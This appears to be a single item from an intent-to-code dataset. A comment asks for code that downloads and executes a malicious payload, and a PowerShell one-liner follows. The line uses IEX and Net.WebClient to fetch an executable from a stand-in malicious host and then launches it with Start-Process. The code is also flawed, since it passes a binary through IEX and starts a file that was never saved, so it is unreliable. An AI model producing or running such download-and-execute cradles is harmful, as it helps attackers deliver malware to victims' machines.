# Natural language intent:
# Download and execute a malicious payload from a specified URL, then start a process with the payload.

IEX (New-Object Net.WebClient).DownloadString('http://example.maliciouswebsite.com/maliciouspayload.exe'); Start-Process maliciouspayload.exe
